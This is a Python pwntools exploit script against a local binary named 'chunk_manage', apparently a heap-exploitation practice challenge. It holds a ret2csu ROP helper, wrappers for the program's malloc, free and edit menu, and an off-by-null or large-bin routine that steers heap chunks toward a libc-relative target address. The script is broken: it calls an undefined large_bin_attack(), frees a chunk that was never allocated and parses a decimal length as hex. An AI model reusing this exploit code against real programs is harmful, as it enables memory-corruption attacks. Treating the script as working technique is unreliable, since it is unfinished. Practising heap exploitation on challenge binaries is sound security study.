from pwn import *
from functools import wraps

ELF_name = '../bin/chunk_manage'
elf = context.binary = ELF(ELF_name)
libc = ELF( './libc.so.6')
#write_got = elf.symbols['read']

if args.DEBUG:
    context.log_level = "info"
else:
    context.log_level = "info"
if args.GDB:
    pass
    #context.terminal = ["tmux","splitw","-h"]

#context.log_level = "debug"

def show_message(func):
    @wraps(func)
    def run_func(*args,**kwargs):
        io.recvuntil("Show messages End\n")
        return func(*args,**kwargs)
    return run_func
gs = '''
b main
'''
def start():
    if args.DEBUG:
        print("why")
        return gdb.debug(elf.path,gdbscript=gs)
    else:
        #return process("../bin/chunk_manage")
        return process(elf.path)
def interactive():
    io.interactive()

csu_front_addr = 0x4005d0
csu_end_addr = 0x4005e6

def csu(rbx,rbp,r12,r13,r14,r15,last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload =  p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(csu_front_addr)
    return payload

def malloc_chunk(chunk_id,size):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("1")
    io.recvuntil("Please input malloc id and size\n")
    if size.startswith("0x"):
        io.sendline(chunk_id +" " +str(int(size,16)))
    else:
        io.sendline(chunk_id + " " + str(int(size,10)))
    io.recvuntil("malloc the chunk success\n")
def free_chunk(chunk_id):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("2")
    io.recvuntil("Please input free id\n")
    io.sendline(chunk_id)
def edit_chunk(chunk_id,size,content):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("3")
    io.recvuntil("Please input the id\n")
    io.sendline(chunk_id)
    io.recvuntil("Please input the context size\n")
    io.sendline(str(int(size,16)))
    io.recvuntil("Please input the chunk note\n")
    io.sendline(content)

def show_chunk():
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("4")
    data = io.recvuntil("all chunk info end")
    print(data)
@show_message
def manage_chunk():
    io.sendline("1")
    malloc_chunk("1","0x50")
    edit_chunk("1","0x20","helloworld")
    show_chunk()
    free_chunk("1")
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("9")


@show_message
def test_malloc_free():
    io.sendline("1")
    malloc_chunk("1","0x50")
    edit_chunk("1","0x40","A"*0x40)
    show_chunk()
    free_chunk("1")
@show_message
def off_by_null_attack():
    print(hex(io.libc.address+0x1b8000)) #会修改目标地址会堆上的地址的值
    targetaddr = p64(io.libc.address+0x1b8000-0x20)
    io.sendline("1")
    malloc_chunk("1","512")  # chunk size 0x430
    malloc_chunk("9","512")  # chunk size 0x4a0
    malloc_chunk("10","512") # chunk size 0x4b0
    #malloc_chunk("2","512")  # chunk size 0x420
    #malloc_chunk("8","512")
    free_chunk("1")
    #gdb.attach(io)
    malloc_chunk("3","0x448")
    edit_chunk("1",str(len(targetaddr*4)),targetaddr*4)
    free_chunk("2") # put the chunk 2 into unsorted bin
    #gdb.attach(io)
    malloc_chunk("4","0x498") # write the targetaddr value
    gdb.attach(io)
io = start()
large_bin_attack()
io.interactive()

